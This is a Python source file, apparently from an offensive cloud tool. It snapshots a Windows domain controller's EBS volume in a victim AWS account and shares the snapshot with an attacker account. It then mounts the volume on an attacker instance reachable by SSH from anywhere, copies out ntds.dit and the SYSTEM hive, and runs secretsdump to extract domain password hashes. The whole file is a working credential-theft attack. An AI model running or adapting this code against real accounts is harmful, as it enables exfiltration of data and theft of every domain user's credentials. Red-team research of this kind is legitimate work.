import time

import boto3
import paramiko
from botocore.exceptions import ClientError


class CloudCopyUtils:
    def __init__(self, loginContext, attackContext):
        self.loginContext = loginContext
        self.attackContext = attackContext
        self.victimInstance = None
        self.victimSnapshot = None
        self.attackingInstance = None
        self.securityGroup = None
        self.botoClient = None
        self.createEc2Resource()

    def setLoginContext(self, loginContext):
        self.loginContext = loginContext

    def setAttackContext(self, attackContext):
        self.attackContext = attackContext

    def createEc2Resource(self):
        if self.loginContext['type'] == 'profile':
            if self.attackContext == 'victim':
                self.botoClient = boto3.Session(profile_name=self.loginContext['options']['victimProfile'],
                                                region_name=self.loginContext['options']['region']).resource('ec2')
            else:
                self.botoClient = boto3.Session(profile_name=self.loginContext['options']['attackerProfile'],
                                                region_name=self.loginContext['options']['region']).resource('ec2')
        else:
            if self.attackContext == 'victim':
                self.botoClient = boto3.Session(
                    aws_access_key_id=self.loginContext['options']['victimAccessKey'],
                    aws_secret_access_key=self.loginContext['options']['victimSecretKey'],
                ).resource('ec2')
            else:
                self.botoClient = boto3.Session(
                    aws_access_key_id=self.loginContext['options']['attackerAccessKey'],
                    aws_secret_access_key=self.loginContext['options']['attackerSecretKey'],
                ).resource('ec2')

    def listInstances(self):
        instances = list(self.botoClient.instances.all())
        for index, instance in enumerate(instances):
            if instance.tags is not None:
                print(str(index) + ' - ' + instance.instance_id + ":" + instance.tags[0]['Value'])

        self.victimInstance = instances[int(input("which instance are we CloudCopying today?"))]

    def createSnapshot(self):
        victimVolumeId = self.victimInstance.block_device_mappings[0]['Ebs']['VolumeId']
        try:
            self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=True)
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                try:
                    self.victimSnapshot = self.botoClient.create_snapshot(VolumeId=victimVolumeId, DryRun=False)
                    self.victimSnapshot.load()
                    while self.victimSnapshot.state != 'completed':
                        print("Snapshot hasn't been created yet, waiting...")
                        self.victimSnapshot.load()
                        time.sleep(10)
                except ClientError:
                    print("Snapshot could not be created, sorry")
                    return False
            elif e.response['Error']['Code'] == 'UnauthorizedOperation':
                print("We do not have the Ec2:CreateSnapshot permission. This attack will not succeed. K-Bye.")
                return False
        return True

    def modifySnapshot(self, attackerAccountId):
        self.victimSnapshot.modify_attribute(Attribute='createVolumePermission', CreateVolumePermission={
            'Add': [{'UserId': attackerAccountId}]
        })
        print("Snapshot should have been shared. Switching to attacker account.")
        self.setAttackContext('attacker')
        self.createEc2Resource()
        self.victimSnapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
        while True:
            try:
                self.victimSnapshot.description  # just checking if this fails to determine if it is in attacker control or not
                break
            except ClientError:
                print("Snapshot hasn't arrived, waiting...")
                time.sleep(10)

        print("We have the snapshot in our control time to mount it to an instance!")

    def createSecurityGroup(self):
        security_groups = list(self.botoClient.security_groups.all())
        for security_group in security_groups:
            if security_group.group_name == 'CredStealerSsh':
                print("Found existing security group: " + security_group.group_id + ". Someone's done this before ;)")
                self.securityGroup = security_group
                return

        security_group = self.botoClient.create_security_group(
            Description='For connecting to cred stealing instance.',
            GroupName='CredStealerSsh'
        )
        security_group.authorize__ingress(GroupId=security_group.group_id, IpProtocol="tcp", CidrIp="0.0.0.0/0",
                                          FromPort=22, ToPort=22)
        print("Finished creating security group for instance")
        self.securityGroup = security_group

    def createInstance(self, instanceSshKey):
        if self.loginContext['options']['instance_id'] == '':
            print("creating instance with key: " + instanceSshKey[instanceSshKey.rindex('/')+1:instanceSshKey.rindex('.')])
            self.attackingInstance = self.botoClient.create_instances(
                BlockDeviceMappings=[{
                    "DeviceName": '/dev/sdf',
                    "Ebs": {
                        "SnapshotId": self.victimSnapshot.snapshot_id
                    }
                }],
                SecurityGroupIds=[
                    self.securityGroup.group_id,
                ],
                SecurityGroups=[
                   'CredStealerSsh',
                ],
                ImageId='ami-0c6b1d09930fac512',
                MaxCount=1,
                MinCount=1,
                InstanceType='t2.micro',
                KeyName=instanceSshKey[instanceSshKey.rindex('/')+1:instanceSshKey.rindex('.')]

            )[0]
            self.attackingInstance.load()
            while self.attackingInstance.state['Name'].strip() != "running":
                print("Your instance will be arriving shortly...")
                time.sleep(10)
                self.attackingInstance.load()
            print("Your instance has arrived. Time to get some sweet sweet creds!")
        else:
            self.attackingInstance = self.botoClient.Instance(self.loginContext['options']['instance_id'])
            print("Using pre CloudCopied instance: " + self.loginContext['options']['instance_id'])

    def grabDCHashFiles(self, instanceSshKey):
        connection, sftp = self.connectToInstance(instanceSshKey)
        #   have to block on these calls to ensure they happen in order
        _, stdout, _ = connection.exec_command("sudo mkdir /windows")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /windows/")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/ntds.dit")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/SYSTEM")
        stdout.channel.recv_exit_status()
        _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
        stdout.channel.recv_exit_status()
        print("Pulling the files...")
        try:
            sftp.get("/home/ec2-user/SYSTEM", "./SYSTEM")
            print("SYSTEM registry hive file retrieval complete")
            sftp.get("/home/ec2-user/ntds.dit", "./ntds.dit")
            print("ntds.dit registry hive file retrieval complete")
        except PermissionError:
            print("hmm we don't seem to have control of the files. Maybe just sftp in yourself and run this part.")
        sftp.close()
        connection.close()
        print("finally gonna run secretsdump!")
        import subprocess
        subprocess.run(
            ["secretsdump.py", "-system", "./SYSTEM", "-ntds", "./ntds.dit", "local", "-outputfile", "secrets"])

    def connectToInstance(self, instanceSshKey):
        key = paramiko.RSAKey.from_private_key_file(instanceSshKey)
        connection = paramiko.SSHClient()
        connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to instance")
        connected = False
        while not connected:
            try:
                connection.connect(hostname=self.attackingInstance.public_dns_name, username='ec2-user', pkey=key)
                connected = True
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("Can't connect yet, instance may still be warming up. Trying again in 10s")
                time.sleep(10)
        sftp = connection.open_sftp()
        return connection, sftp